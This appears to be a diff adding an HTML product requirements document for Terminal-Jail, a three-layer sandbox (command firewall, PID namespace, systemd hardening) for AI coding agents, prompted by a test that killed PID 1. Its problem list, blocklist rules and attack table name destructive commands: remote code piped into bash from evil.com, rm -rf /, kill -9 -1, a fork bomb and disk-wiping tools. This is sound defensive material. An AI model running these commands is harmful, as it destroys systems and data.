@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PRD: Terminal-Jail — AI Agent Process Sandbox</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; line-height: 1.65; padding: 2rem; max-width: 860px; margin: 0 auto; }
+h1 { font-size: 2rem; color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 0.5rem; margin-bottom: 1rem; }
+h2 { font-size: 1.4rem; color: #f0883e; margin: 2.5rem 0 0.75rem; border-bottom: 1px solid #30363d; padding-bottom: 0.25rem; }
+h3 { font-size: 1.1rem; color: #d2a8ff; margin: 1.5rem 0 0.5rem; }
+p { margin: 0.6rem 0; }
+strong { color: #e6edf3; }
+.badge { display: inline-block; padding: 3px 10px; border-radius: 4px; font-size: 0.8rem; font-weight: 600; margin-right: 0.4rem; }
+.badge.green { background: #238636; color: #fff; }
+.badge.red { background: #da3633; color: #fff; }
+.badge.yellow { background: #d29922; color: #000; }
+.badge.purple { background: #8957e5; color: #fff; }
+.badge.gray { background: #30363d; color: #8b949e; }
+pre { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; overflow-x: auto; font-size: 0.82rem; margin: 0.75rem 0; }
+code { font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace; font-size: 0.85em; }
+pre code { font-size: inherit; }
+.diagram { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 1.25rem; margin: 1rem 0; font-family: 'SF Mono', monospace; font-size: 0.8rem; line-height: 1.55; white-space: pre; overflow-x: auto; color: #7ee787; }
+.diagram.red { color: #ff7b72; }
+table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+th { background: #21262d; text-align: left; padding: 8px 12px; border: 1px solid #30363d; font-size: 0.85rem; }
+td { padding: 8px 12px; border: 1px solid #30363d; font-size: 0.85rem; }
+tr:nth-child(even) { background: #161b22; }
+blockquote { border-left: 3px solid #58a6ff; margin: 1rem 0; padding: 0.5rem 1rem; background: #161b22; border-radius: 0 6px 6px 0; color: #8b949e; font-size: 0.9rem; }
+.callout { border-left: 3px solid #d29922; padding: 0.75rem 1rem; background: #161b22; border-radius: 0 6px 6px 0; margin: 1rem 0; }
+.callout.red { border-left-color: #da3633; }
+.callout.green { border-left-color: #238636; }
+ul, ol { margin: 0.5rem 0 0.5rem 1.5rem; }
+li { margin: 0.3rem 0; }
+.footer { margin-top: 3rem; padding-top: 1rem; border-top: 1px solid #30363d; color: #8b949e; font-size: 0.8rem; text-align: center; }
+a { color: #58a6ff; }
+</style>
+</head>
+<body>
+
+<h1>PRD: Terminal-Jail</h1>
+<p style="color: #8b949e;">Three-Layer Process Sandbox for AI Agent Infrastructure<br>
+<strong>v1.1</strong> · Open Source (MIT) · <a href="https://github.com/totalwindupflightsystems/terminal-jail">github.com/totalwindupflightsystems/terminal-jail</a></p>
+
+<div class="callout green">
+<strong>Feedback sought.</strong> This PRD describes what we've built and where we're going.
+Is this the right problem? Right architecture? What are we missing? Reply to @wojons on X
+or open an issue on GitHub.
+</div>
+
+<h2>1. The Problem</h2>
+
+<p>AI coding agents run arbitrary shell commands. Every command is a potential system kill switch.</p>
+
+<p><strong>Real incident — July 19, 2026:</strong> A <code>pytest</code> run on a Hermes agent foreman contained a mocked <code>MagicMock()</code> object whose <code>__index__()</code> method resolved to integer <code>1</code>. The test called <code>os.killpg(1, SIGKILL)</code>. PID 1 on Linux is <code>init</code>/<code>systemd</code> — the process group leader for the entire user session.</p>
+
+<div class="diagram red">
+BEFORE: MagicMock().__index__() = 1 → killpg(1, SIGKILL) → PID 1 = init
+
+  ✗ Hermes Gateway         (SIGKILL)
+  ✗ Cron scheduler          (SIGKILL)
+  ✗ Signal daemon          (SIGKILL)
+  ✗ Docker containers       (SIGKILL)
+  ✗ User shells            (SIGKILL)
+  ✗ LSP servers            (SIGKILL)
+  ✗ DuckBrain / Chimera    (SIGKILL)
+
+  Result: 56 gateway deaths/day, 8-minute boot cycles, 30+ hours undiagnosed</div>
+
+<p>Every diagnostic pointed at memory pressure. OOM killer — zero kills. systemd-oomd — zero kills. The real cause was a test framework killing everything on the system, and every restart triggering the same cycle.</p>
+
+<p><strong>The bigger problem:</strong> This wasn't a malicious attack. It was a benign <code>pytest</code> run. AI agents run tests, build scripts, package installers, and subprocess chains thousands of times per day. Any one of them can:</p>
+
+<ul>
+  <li>Call <code>killpg(1, SIGKILL)</code> — kills every process owned by the user</li>
+  <li>Pipe <code>curl evil.com | bash</code> — arbitrary code execution from the internet</li>
+  <li>Execute <code>rm -rf /</code> — total filesystem destruction</li>
+  <li>Spawn fork bombs — PID exhaustion</li>
+  <li>Run <code>sudo</code> if passwordless — privilege escalation</li>
+</ul>
+
+<p><strong>Existing solutions don't catch this.</strong> Docker containers, VM sandboxes, and filesystem-only isolation (bubblewrap, Nix, gVisor) focus on <em>where</em> code runs — they don't inspect <em>what</em> commands do. The agent still has a shell. The shell still has a PID namespace. <code>kill -9 -1</code> inside a Docker container kills the container. It doesn't matter — but if you run agents on bare metal (many do for performance), there's no container to sacrifice.</p>
+
+<h2>2. The Solution: Three-Layer Defense</h2>
+
+<p>Terminal-Jail wraps every terminal command an AI agent runs through three independent security layers. No single layer is trusted to hold the line alone.</p>
+
+<div class="diagram">
+LAYER 1: INTERRUPTOR — Command Firewall
+  "rm -rf /" → BLOCKED before execution
+  "pytest"   → MODIFIED (auto-wrapped in sandbox)
+  "echo hi"  → ALLOWED (passthrough)
+           │
+           ▼
+LAYER 2: PID NAMESPACE JAIL
+  unshare --user --pid --fork --kill-child=SIGKILL
+  PID 1 inside jail = /bin/bash, not init
+  kill -9 -1 kills only the sandbox
+  Seccomp BPF denies 18 dangerous syscalls
+           │
+           ▼
+LAYER 3: SYSTEMD HARDENING
+  PrivateUsers, ProtectProc=invisible
+  RestrictNamespaces=~pid, NoNewPrivileges
+  Read-only filesystem, capability bounding set
+           │
+           ▼
+       Linux Kernel
+</div>
+
+<h3>Layer 1: Interruptor — "Stop it before it runs"</h3>
+<p>A bash-level command firewall. Every command passes through a rule engine that returns ALLOW, BLOCK, or MODIFY.</p>
+<ul>
+  <li><strong>10 critical blocklist rules:</strong> <code>rm -rf /</code>, <code>curl | bash</code>, <code>sudo</code>, fork bombs, <code>mkfs</code>, <code>dd of=/dev/</code>, <code>chmod 777 /</code>, redirect to <code>/etc/</code>, <code>fdisk</code>, <code>kill -9 -1</code></li>
+  <li><strong>8 auto-sandbox rules:</strong> <code>pytest</code>, <code>npm test</code>, <code>go test</code>, <code>make</code>, <code>pip install</code>, <code>cargo</code>, <code>gcc</code>, script execution — automatically wrapped in PID namespace</li>
+  <li><strong>9 always-allow rules:</strong> <code>echo</code>, <code>ls</code>, <code>cd</code>, <code>grep</code>, <code>git status</code>, <code>cat</code>, <code>find</code> (no -exec), <code>python --version</code>, <code>which</code></li>
+  <li><strong>User-defined rules:</strong> YAML files in <code>~/.config/terminal-jail/rules.d/</code>. 9 match types (pattern, command, pipeline, subcommand, path, composite, syscall, network, heredoc).</li>
+</ul>
+
+<h3>Layer 2: PID Namespace Jail — "Contain the blast radius"</h3>
+<p>If a command passes the firewall (or is auto-sandboxed), it executes inside a Linux PID namespace. Inside the namespace, PID 1 is a fresh <code>/bin/bash</code> — not the real <code>init</code>. Any process-kill operation is trapped inside the sandbox.</p>
+<ul>
+  <li><strong>Seccomp BPF filter:</strong> Denies <code>mount</code>, <code>kexec_load</code>, <code>init_module</code>, <code>swapon</code>, <code>settimeofday</code>, and 13 more dangerous syscalls. Pure Python, zero dependencies.</li>
+  <li><strong>User namespace:</strong> Optional UID isolation — runs as <code>nobody</code> (uid=65534).</li>
+  <li><strong>Zero dependencies:</strong> Python stdlib only. No bubblewrap, Docker, Nix, or Rust required.</li>
+</ul>
+
+<h3>Layer 3: systemd Hardening — "Prevent kernel escape"</h3>
+<p>14 systemd hardening directives applied to the agent gateway service unit:</p>
+<ul>
+  <li><code>ProtectProc=invisible</code> — other processes hidden from <code>/proc</code></li>
+  <li><code>PrivateUsers=true</code> — UID namespace isolation</li>
+  <li><code>RestrictNamespaces=~pid</code> — PID namespace escape blocked</li>
+  <li><code>NoNewPrivileges=true</code> — capability escalation impossible</li>
+  <li><code>ProtectSystem=strict</code> — read-only root filesystem</li>
+  <li><code>CapabilityBoundingSet</code> — drops <code>CAP_SYS_ADMIN</code> and 9 others</li>
+</ul>
+
+<h2>3. Deployment Model</h2>
+
+<p><strong>One line in systemd.</strong> The entire system deploys by replacing the agent's <code>$SHELL</code>:</p>
+
+<pre><code># /etc/systemd/system/hermes-gateway.service.d/95-jail.conf
+[Service]
+Environment="SHELL=/usr/local/bin/terminal-jail-sh"</code></pre>
+
+<p>Every command the agent runs — whether <code>ls</code>, <code>pytest</code>, or <code>curl</code> — goes through the interruptor and PID namespace automatically. No code changes to the agent. No container wrapper. No Docker overhead.</p>
+
+<p><strong>Also ships as standalone CLI:</strong></p>
+<pre><code>terminal-jail pytest                    # PID namespace only
+terminal-jail --user --seccomp npm test  # Full isolation
+terminal-jail --interruptor curl https://example.com  # Firewall enabled</code></pre>
+
+<h2>4. What Makes This Different</h2>
+
+<table>
+<tr><th>Existing Approach</th><th>Limitation</th><th>Terminal-Jail</th></tr>
+<tr>
+  <td><strong>Docker / VM sandboxes</strong></td>
+  <td>Heavy. Doesn't inspect commands. <code>kill -9 -1</code> kills container but not host — but agents on bare metal have no container.</td>
+  <td>Lightweight. Kernel namespaces without containers. Works on bare metal.</td>
+</tr>
+<tr>
+  <td><strong>Filesystem-only isolation</strong> (bubblewrap, Nix, gVisor)</td>
+  <td>Protects files. Doesn't protect processes. <code>killpg(1)</code> still works.</td>
+  <td>PID namespace isolation specifically targets process-kill attacks.</td>
+</tr>
+<tr>
+  <td><strong>just-bash</strong> (TypeScript bash reimplementation)</td>
+  <td>Overlay filesystem. Doesn't address process namespace attacks. Rewrites bash — massive surface.</td>
+  <td>Wraps real bash — smaller surface, same kernel isolation.</td>
+</tr>
+<tr>
+  <td><strong>ai-jail</strong> (Rust + bubblewrap)</td>
+  <td>Filesystem + network isolation. No command-level inspection.</td>
+  <td>Command firewall with user-extensible YAML rules. Three defense layers.</td>
+</tr>
+<tr>
+  <td><strong>Kavach</strong> (interceptor with redirects)</td>
+  <td>Spoofs/redirects commands. Complex, attack surface from redirect logic.</td>
+  <td>Block/allow/modify model. Simpler. No redirect attack surface.</td>
+</tr>
+</table>
+
+<div class="callout">
+<strong>Key insight:</strong> Most agent sandboxes focus on filesystem and network. Terminal-jail focuses on <em>process namespace attacks</em> — specifically, agents killing their own infrastructure. This is a different threat model. Filesystem isolation prevents data exfiltration. Process namespace isolation prevents infrastructure self-destruction. Both are necessary.
+</div>
+
+<h2>5. Attack Vectors — What Gets Caught</h2>
+
+<table>
+<tr><th>Attack</th><th>Interruptor</th><th>PID Jail</th><th>systemd</th></tr>
+<tr><td><code>kill -9 -1</code> (mass process kill)</td><td><span class="badge green">BLOCKED</span></td><td><span class="badge green">CONTAINED</span></td><td><span class="badge green">HARDENED</span></td></tr>
+<tr><td><code>os.killpg(1, SIGKILL)</code></td><td>—</td><td><span class="badge green">CONTAINED</span></td><td><span class="badge green">HARDENED</span></td></tr>
+<tr><td><code>curl evil.com | bash</code></td><td><span class="badge green">BLOCKED</span></td><td><span class="badge green">CONTAINED</span></td><td>—</td></tr>
+<tr><td><code>rm -rf /</code></td><td><span class="badge green">BLOCKED</span></td><td><span class="badge green">CONTAINED</span></td><td><span class="badge green">FS READ-ONLY</span></td></tr>
+<tr><td>Fork bomb <code>:(){ :|:& };:</code></td><td><span class="badge green">BLOCKED</span></td><td><span class="badge green">CONTAINED</span></td><td><span class="badge green">TasksMax=256</span></td></tr>
+<tr><td><code>sudo</code> privilege escalation</td><td><span class="badge green">BLOCKED</span></td><td>—</td><td><span class="badge green">NoNewPrivileges</span></td></tr>
+<tr><td>Malicious pip package <code>fork()</code> loop</td><td>—</td><td><span class="badge green">CONTAINED</span></td><td><span class="badge green">TasksMax</span></td></tr>
+<tr><td><code>mkfs</code> / <code>dd</code> / <code>fdisk</code></td><td><span class="badge green">BLOCKED</span></td><td>—</td><td><span class="badge green">CapBnd</span></td></tr>
+<tr><td>Redirect to <code>/etc/passwd</code></td><td><span class="badge green">BLOCKED</span></td><td>—</td><td><span class="badge green">FS READ-ONLY</span></td></tr>
+<tr><td><code>mount</code> / <code>kexec</code> / <code>insmod</code></td><td>—</td><td><span class="badge green">SECCOMP</span></td><td><span class="badge green">CapBnd</span></td></tr>
+</table>
+
+<h2>6. Current State</h2>
+
+<div class="metric-grid" style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 0.75rem; margin: 1rem 0;">
+  <div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1rem;text-align:center;"><div style="font-size:1.8rem;font-weight:700;color:#58a6ff;">104</div><div style="font-size:0.75rem;color:#8b949e;">Commits</div></div>
+  <div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1rem;text-align:center;"><div style="font-size:1.8rem;font-weight:700;color:#3fb950;">215</div><div style="font-size:0.75rem;color:#8b949e;">Tests Passing</div></div>
+  <div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1rem;text-align:center;"><div style="font-size:1.8rem;font-weight:700;color:#d2a8ff;">27</div><div style="font-size:0.75rem;color:#8b949e;">Source Files</div></div>
+  <div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1rem;text-align:center;"><div style="font-size:1.8rem;font-weight:700;color:#e3b341;">0</div><div style="font-size:0.75rem;color:#8b949e;">Dependencies</div></div>
+</div>
+
+<table>
+<tr><th>Phase</th><th>Description</th><th>Status</th></tr>
+<tr><td>Phases 0–4</td><td>Core plugin, specs, standalone CLI, observability plugin</td><td><span class="badge green">COMPLETE</span></td></tr>
+<tr><td>Phase 7</td><td>Metrics export, observability hooks, DuckBrain dashboard</td><td><span class="badge green">COMPLETE</span></td></tr>
+<tr><td>Phase 8</td><td>v1.0.0 release, CONTRIBUTING.md, issue templates, compatibility matrix, ADRs</td><td><span class="badge green">COMPLETE</span></td></tr>
+<tr><td>Phase 9</td><td>Threat model, penetration test plan (55 scenarios), dependency audit, supply chain, seccomp profile, user namespaces</td><td><span class="badge green">COMPLETE</span></td></tr>
+<tr><td>Phase 10</td><td>Kernel watchdog, unshare tracker, LKML monitoring, quarterly review, PR SLA</td><td><span class="badge green">COMPLETE</span></td></tr>
+<tr><td><strong>Phase 11</strong></td><td><strong>Interruptor Bash Engine</strong> — command firewall, 27 built-in rules, 9 match types, 3 modes, user-extensible YAML rules, 40 test scenarios</td><td><span class="badge green">COMPLETE</span></td></tr>
+<tr><td>Phase 5</td><td>systemd defense-in-depth deployment (14 hardening directives)</td><td><span class="badge yellow">BLOCKED — no sudo on host</span></td></tr>
+<tr><td>Phase 6</td><td>Production deployment — dry run, monitoring, cutover</td><td><span class="badge yellow">BLOCKED — requires Phase 5</span></td></tr>
+<tr><td>T9.4</td><td>GPG release signing</td><td><span class="badge yellow">BLOCKED — manual keygen</span></td></tr>
+</table>
+
+<h2>7. Docker Integration Test Results</h2>
+<p>Full battery in privileged Ubuntu 24.04 container — 2026-07-24.</p>
+<table>
+<tr><th>Test Category</th><th>Count</th><th>Result</th></tr>
+<tr><td>Blocklist — critical patterns</td><td>8/8</td><td><span class="badge green">PASS</span></td></tr>
+<tr><td>Auto-sandbox — test runners & build tools</td><td>6/6</td><td><span class="badge green">PASS</span></td></tr>
+<tr><td>Allowlist — safe commands</td><td>6/6</td><td><span class="badge green">PASS</span></td></tr>
+<tr><td>Shell shim — <code>-lic</code> invocation handler</td><td>3/3</td><td><span class="badge green">PASS</span></td></tr>
+<tr><td>PID namespace containment</td><td>1/1</td><td><span class="badge green">PASS</span></td></tr>
+<tr><td>Mode switching — warn + disabled</td><td>2/2</td><td><span class="badge green">PASS</span></td></tr>
+<tr><td>User-defined YAML rules</td><td>1/1</td><td><span class="badge green">PASS</span></td></tr>
+</table>
+
+<h2>8. Roadmap — What's Next</h2>
+
+<h3>Immediate (unblocks with sudo)</h3>
+<ol>
+  <li>Deploy shell wrapper + systemd hardening to karaHermes gateway</li>
+  <li>Verify isolation with real agent traffic</li>
+  <li>Monitor jail metrics for 1 week</li>
+</ol>
+
+<h3>Near-term</h3>
+<ol>
+  <li>Get Hermes core PR #68216 merged — <code>--sandbox</code> CLI flag</li>
+  <li>Network namespace isolation (<code>--unshare-net</code>)</li>
+  <li>Filesystem overlay for write protection</li>
+  <li>Prometheus/Grafana metrics dashboard</li>
+  <li>macOS seatbelt support</li>
+</ol>
+
+<h3>Long-term</h3>
+<ol>
+  <li>Hermes plugin marketplace listing</li>
+  <li>Multi-agent isolation — per-agent PID namespaces</li>
+  <li>eBPF-based syscall monitoring</li>
+  <li>Fuzzing harness for rule engine</li>
+  <li>Third-party security audit</li>
+</ol>
+
+<h2>9. Architecture Decision Records</h2>
+<table>
+<tr><th>ADR</th><th>Decision</th><th>Why</th></tr>
+<tr><td>001</td><td>PID namespace via <code>unshare</code></td><td>Simplest kernel isolation primitive. No root required with <code>--user</code>.</td></tr>
+<tr><td>002</td><td><code>--kill-child=SIGKILL</code></td><td>SIGKILL cannot be caught. Ensures no orphan processes.</td></tr>
+<tr><td>003</td><td>Use <code>bash</code> not <code>sh</code></td><td>AI-generated commands use bash-isms. POSIX sh would reject them.</td></tr>
+<tr><td>004</td><td>Defer cgroup isolation to systemd</td><td>systemd already provides cgroup enforcement. Don't duplicate.</td></tr>
+<tr><td>005</td><td>Plugin is observability-only</td><td>Hermes core lacks command-transform hooks. Real isolation at shell/systemd layer.</td></tr>
+</table>
+
+<h2>10. Questions for Reviewers</h2>
+
+<ol>
+  <li><strong>Threat model:</strong> Does three-layer defense (firewall → namespace → systemd) cover the attacks you care about? What's missing?</li>
+  <li><strong>Deployment model:</strong> Is "replace <code>$SHELL</code>" the right integration point? Would a ptrace-based interceptor be better?</li>
+  <li><strong>Rule engine:</strong> Should the interruptor use a proper shell parser (e.g., <code>shlex</code> AST) instead of regex patterns? Where does regex break?</li>
+  <li><strong>Cross-platform:</strong> This is Linux-only (PID namespaces). Is macOS support (sandbox-exec / Seatbelt) worth the complexity?</li>
+  <li><strong>Network isolation:</strong> Should <code>--unshare-net</code> be on by default? Does that break too many agent workflows?</li>
+  <li><strong>Filesystem overlay:</strong> Should we add an overlay filesystem (like just-bash) so writes are virtual? Or is systemd's read-only root sufficient?</li>
+</ol>
+
+<div class="footer">
+  <p>Terminal-Jail v1.1 — MIT License — <a href="https://github.com/totalwindupflightsystems/terminal-jail">github.com/totalwindupflightsystems/terminal-jail</a></p>
+  <p>Feedback: <a href="https://github.com/totalwindupflightsystems/terminal-jail/issues">GitHub Issues</a> or @wojons on X</p>
+</div>
+
+</body>
+</html>
